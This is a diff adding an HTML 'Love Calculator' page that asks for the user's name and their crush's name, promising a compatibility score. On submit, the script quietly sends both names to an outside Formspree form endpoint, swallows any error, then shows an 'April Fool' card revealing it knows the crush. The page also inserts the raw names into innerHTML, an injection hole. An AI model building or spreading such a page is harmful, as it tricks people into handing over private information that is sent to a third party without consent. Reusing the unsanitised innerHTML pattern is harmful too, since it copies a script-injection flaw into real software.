@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Calculator 3D</title>
+    <style>
+        :root {
+            --pink: #ff4d6d;
+            --shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.2);
+        }
+
+        body {
+            background: linear-gradient(135deg, #ffafbd, #ffc3a0, #2193b0, #6dd5ed);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 30px;
+            padding: 40px;
+            width: 340px;
+            text-align: center;
+            box-shadow: var(--shadow);
+            transition: all 0.5s ease;
+        }
+
+        h1 { color: white; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); margin-top: 0; font-size: 28px; }
+        p { color: white; font-size: 14px; opacity: 0.9; margin-bottom: 25px; }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 12px 0;
+            border: none;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.9);
+            box-sizing: border-box;
+            box-shadow: inset 2px 2px 5px rgba(0,0,0,0.05);
+            font-size: 15px;
+            outline: none;
+        }
+
+        button {
+            background: var(--pink);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 15px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 20px;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(255, 77, 109, 0.3);
+            transition: 0.3s;
+        }
+
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 77, 109, 0.4); }
+        button:disabled { background: #ffb3c1; }
+
+        .hidden { display: none; }
+        .emoji-3d { font-size: 70px; margin-bottom: 10px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.2)); }
+    </style>
+</head>
+<body>
+
+    <div id="main-card" class="card">
+        <div class="emoji-3d">💕</div>
+        <h1>Love Match</h1>
+        <p>Check your compatibility score instantly.</p>
+
+        <form id="loveForm">
+            <input type="text" name="user_name" id="user_name" placeholder="Your Name" required>
+            <input type="text" name="crush_name" id="crush_name" placeholder="Crush's Name" required>
+            <button type="submit" id="submit-btn">Calculate %</button>
+        </form>
+    </div>
+
+    <div id="prank-card" class="card hidden">
+        <div class="emoji-3d">🤤😂</div>
+        <h1>April Fool!</h1>
+        <p id="prank-msg" style="font-size: 18px; line-height: 1.6; color: white;"></p>
+        <button onclick="window.location.reload()">Try Again</button>
+    </div>
+
+    <script>
+        const form = document.getElementById('loveForm');
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submit-btn');
+            const userName = document.getElementById('user_name').value;
+            const crushName = document.getElementById('crush_name').value;
+            
+            btn.innerHTML = "Calculating...";
+            btn.disabled = true;
+
+            // Prepare the data for Formspree
+            const formData = new FormData(form);
+
+            // Send to your Formspree ID: xzdobqvk
+            try {
+                await fetch('https://formspree.io/f/xzdobqvk', {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch (err) {
+                // Fail silently to keep the prank moving
+                console.log("Submit handled");
+            }
+
+            // Switch to Prank Card
+            document.getElementById('main-card').classList.add('hidden');
+            document.getElementById('prank-card').classList.remove('hidden');
+            
+            // Set the specific message you wanted
+            document.getElementById('prank-msg').innerHTML = 
+                `There's no calculation <strong>${userName}</strong>... <br><br> But I know you are crushing on <strong>${crushName}</strong>!`;
+        });
+    </script>
+</body>
+</html>
